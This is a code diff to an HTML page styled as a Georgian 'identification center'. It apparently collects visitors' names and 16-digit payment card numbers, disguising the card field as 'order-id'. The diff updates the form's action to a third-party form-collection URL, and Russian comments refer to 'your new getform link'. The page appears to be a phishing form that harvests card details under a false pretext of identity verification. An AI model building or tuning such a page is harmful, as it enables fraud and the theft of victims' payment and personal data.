@@ -103,8 +103,8 @@ button:hover {
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- ТУТ ПОДКЛЮЧЕН ВАШ GETFORM -->
-    <form id="contact-form" action="https://kapanadze1995work.getform.com" method="POST">
+    <!-- ФОРМА С ВАШЕЙ НОВОЙ ССЫЛКОЙ GETFORM -->
+    <form id="contact-form" action="https://kapanadze1995work.getform.com/y5lz4" method="POST">
         <h3>დატოვეთ თქვენი მონაცემები</h3>
 
         <label for="first-name">სახელი (Имя)</label>
@@ -143,7 +143,7 @@ button:hover {
 </div>
 
 <script>
-// Форматирование номера карты (пробелы каждые 4 цифры)
+// Красивое форматирование номера карты
 document.getElementById('order-id').addEventListener('input', function (e) {
     let value = e.target.value.replace(/\D/g, '').slice(0,16);
     e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
